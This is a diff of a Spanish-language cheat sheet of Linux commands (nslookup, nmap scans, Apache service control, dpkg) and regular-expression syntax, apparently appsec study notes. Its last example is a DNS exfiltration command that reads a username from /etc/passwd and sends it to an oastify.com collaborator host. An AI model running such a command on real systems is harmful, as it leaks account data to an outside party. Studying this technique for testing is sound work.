@@ -1,4 +1,4 @@
-# Comandos Linux
+## Comandos Linux
 
 nslookup domain.com           # Sirve para que nos regrese la ip del dominio ingresado
 test=$(whoami)                # Guardas un comando en una variable 
@@ -8,13 +8,17 @@ nmap localhost -p$(nmap localhost | grep "/" | tail -n 4 | cut -d "/" -f 1) -sV
   d = delimitador 
   n = numero de lineas 
 
+nmap | grep "\v"              # Buscar 
+
 service apache2 start         # Iniciar el servicio Apache2
 systemctl stop apache2        # Paramos el servicio de Apache2
 systemctl start apache2       # Iniciar el servicio de apache 
 
+dpkg -i chrome.deb            # Instalar el paquete, i = instalar  
 
 
-# Expresiones regulares 
+
+## Expresiones regulares 
 appsec = Palabra a buscar 
 [a-z] = Letras minusculas
 [A-Z] = Letras mayusculas 
@@ -26,5 +30,8 @@ $ = Debe finalizar con
 Ejemplo: 
 nmap localhost | grep "^[0-9]" | cut -d "/" -f 1 
 nslookup $(cat /etc/passwd | grep "1005" | cut -d ":" -f 1).kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
+
+
+## 
 
 
